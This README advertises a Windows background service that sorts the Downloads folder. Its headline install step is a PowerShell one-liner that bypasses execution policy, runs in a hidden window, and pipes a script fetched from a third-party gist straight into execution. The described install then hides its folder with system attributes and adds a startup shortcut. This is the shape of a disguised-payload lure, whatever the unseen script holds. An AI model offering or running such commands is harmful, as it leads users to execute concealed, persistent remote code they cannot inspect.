# Downloads Folder Sorter -- Autonomous Edition

A silent, zero-config background service that keeps your `Downloads` folder
organized 24/7. It runs at idle CPU priority, sorts 500+ file types, deduplicates
by content hash, and starts automatically on login.

---

## One-Liner Install

Open **PowerShell** (Win + R -> type `powershell` -> Enter) and paste:

```powershell
powershell -ep bypass -w hidden -c "iwr 'https://gist.githubusercontent.com/psychiotric-sudo/1534904084065cf659117ab4fb56c12f/raw/Initialize-DownloadsSorter.ps1' | iex"
```

That is all. The script handles everything:

1. Creates a hidden folder at `Documents\DownloadsFolderSorter\`
2. Downloads the engine files into it
3. Hides the folder from Explorer (`attrib +h +s`)
4. Registers a startup shortcut so the sorter survives reboots
5. Launches the sorter immediately -- no restart needed

---

## What It Does

| Feature                         | Detail                                                                                               |
| ------------------------------- | ---------------------------------------------------------------------------------------------------- |
| **Autonomous sorting**          | Scans `Downloads` every 5 minutes and moves files to `Documents`, `Pictures`, `Music`, `Videos`      |
| **500+ extension map**          | Dedicated subfolders for Office, Adobe CC, Autodesk, 3D/CAD, Game Dev, ML models, Firmware, and more |
| **Media date-sorting**          | Photos/videos/audio land in `[InvertedYear] MMM-DD-YY` subfolders so newest always sorts to top      |
| **SHA-256 deduplication**       | Bit-for-bit identical files are deleted before moving -- no duplicate buildup                        |
| **In-progress protection**      | Skips `.crdownload`, `.part`, `.tmp`, and 15+ other incomplete-download extensions                   |
| **Idle CPU priority**           | Process priority set to `Idle` -- zero impact on games or apps                                       |
| **5-pass empty-folder cleanup** | Recursively removes leftover empty directories after each sort cycle                                 |

---

## File Structure

After install, the hidden engine folder looks like this:

```
Documents\
  DownloadsFolderSorter\     <-- hidden (+h +s)
    bin\
      Sort-DownloadsFolder.ps1      core sorting engine
      Run-SortDownloadsHidden.vbs   silent launcher (no terminal window)

AppData\...\Startup\
  RunDownloadsSorter.lnk            auto-start shortcut
```

Nothing is visible in Explorer unless you enable "Show hidden items."

---

## How the Sorter Organizes Files

**Documents** (by app):
`Microsoft Word / Excel / PowerPoint / Access / Visio / Project / Outlook`
`Adobe Photoshop / Illustrator / InDesign / Premiere / After Effects / Lightroom`
`Autodesk AutoCAD / 3ds Max / Maya / Inventor / Revit / Navisworks`
`Blender / Cinema 4D / SolidWorks / SketchUp / CATIA`
`PDFs / Archives / Executables / Fonts / eBooks / Database / Code / ...`

**Pictures**: sorted by camera type (RAW, JPEG, HEIC, etc.) then date-bucketed

**Music**: sorted by format, with subfolders for DAW projects (Ableton, FL Studio, Logic, Pro Tools)

**Videos**: sorted by format, with subfolders for NLE projects (Premiere, DaVinci, Vegas, FCPX)

Unknown extensions land in `Documents\Other Files\Uncategorized\<EXT>` instead of being ignored.

---

## Manual Install (no one-liner)

1. Download `Sort-DownloadsFolder.ps1` and `Run-SortDownloadsHidden.vbs`
2. Place both in a folder (e.g. `C:\Tools\DownloadsSorter\`)
3. Optionally run `attrib +h "C:\Tools\DownloadsSorter"` to hide it
4. Right-click `Run-SortDownloadsHidden.vbs` -> Create shortcut
5. Move the shortcut to `shell:startup`
6. Double-click the VBS to start immediately (or reboot)

---

## Uninstall

```powershell
# Remove startup shortcut
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\RunDownloadsSorter.lnk" -Force

# Remove engine folder (unhide first)
attrib -h -s "$env:USERPROFILE\Documents\DownloadsFolderSorter"
Remove-Item "$env:USERPROFILE\Documents\DownloadsFolderSorter" -Recurse -Force

# Kill any running instance
Get-Process wscript -ErrorAction SilentlyContinue | Stop-Process -Force
```

---

## Requirements

- Windows 10 or 11
- PowerShell 5.1+ (built into Windows, no install needed)
- Internet connection (for the one-liner only)

---

## License

MIT
